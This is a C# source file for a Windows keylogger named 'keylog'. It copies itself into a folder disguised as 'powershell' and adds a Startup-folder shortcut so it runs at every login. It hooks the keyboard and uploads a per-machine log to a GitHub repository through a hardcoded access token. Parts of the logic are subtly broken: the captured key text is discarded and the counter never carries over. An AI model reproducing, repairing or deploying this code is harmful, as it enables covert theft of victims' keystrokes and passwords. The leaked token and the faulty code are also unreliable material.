using System;
using System.IO;
using System.Linq;
using CSharpLib;
using Octokit;
using H.Hooks;
using System.Threading;

namespace keylog
{
    class Program
    {
        static void Main(string[] args)
        {

            string computer = Environment.MachineName;
            string fileName = computer + ".txt";
            string path = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments) + "/" + fileName;
            string source = Environment.CurrentDirectory + "/log.lnk";
            string dest = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "/Microsoft/Windows/Start Menu/Programs/Startup/log.lnk";
            string prog = Directory.GetParent(Environment.CurrentDirectory).Parent.Parent.FullName + "/keylog";
            string dest2 = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments) + "/powershell";

            if (!File.Exists(dest))
            {
                foreach (string dirPath in Directory.GetDirectories(prog, "*", SearchOption.AllDirectories))
                {
                    Directory.CreateDirectory(dirPath.Replace(prog, dest2));
                }
                foreach (string newPath in Directory.GetFiles(prog, "*.*", SearchOption.AllDirectories))
                {
                    File.Copy(newPath, newPath.Replace(prog, dest2), true);
                }
                Shortcut shortcut = new Shortcut();
                shortcut.CreateShortcutToFile(Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments) + "/powershell/bin/Debug/keylog.exe", "log.lnk");
                File.Copy(source, dest);

            }
            log(path, computer);
        }
        static void log(string path, string computer)
        {

            string tmp = "";
            int count = 0;
            if (!File.Exists(path))
            {
                var myFile = File.Create(path);
                myFile.Close();
            }
            var keyboardHook = new LowLevelKeyboardHook();
            keyboardHook.Down += (_, args) => write($"{nameof(keyboardHook.Down)}: {args}", path, computer, count);
            keyboardHook.Up += (_, args) => count++;
            keyboardHook.Start();
            SpinWait.SpinUntil(() => false);
        }
        static void write(string tmp, string path, string computer, int count)
        {
            tmp = tmp.Substring(tmp.Length - 1);
            tmp = "";
            if (count > 10)
            {
                File.AppendAllText(path, tmp);
                upload(path, computer);
                count = 0;
            }
        }
        static async void upload(string path, string computer)
        {
                var gitHubClient = new GitHubClient(new ProductHeaderValue("keylog"));
                gitHubClient.Credentials = new Credentials("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");
            try
            {
                var fileDetails = await gitHubClient.Repository.Content.GetAllContentsByRef("Stalinisator", "keylog",
                computer, "main");
                var updateChangeSet = gitHubClient.Repository.Content.UpdateFile("Stalinisator", "keylog", computer,
                new UpdateFileRequest($"commit for {computer}", File.ReadAllText(path), fileDetails.First().Sha, "main"));
            }
            catch (Exception e)
            {
                var fileDetails = gitHubClient.Repository.Content.CreateFile(
                "Stalinisator", "keylog", computer,
                new CreateFileRequest($"commit for {computer}", File.ReadAllText(path), "main"));
            }

        }
    }
}
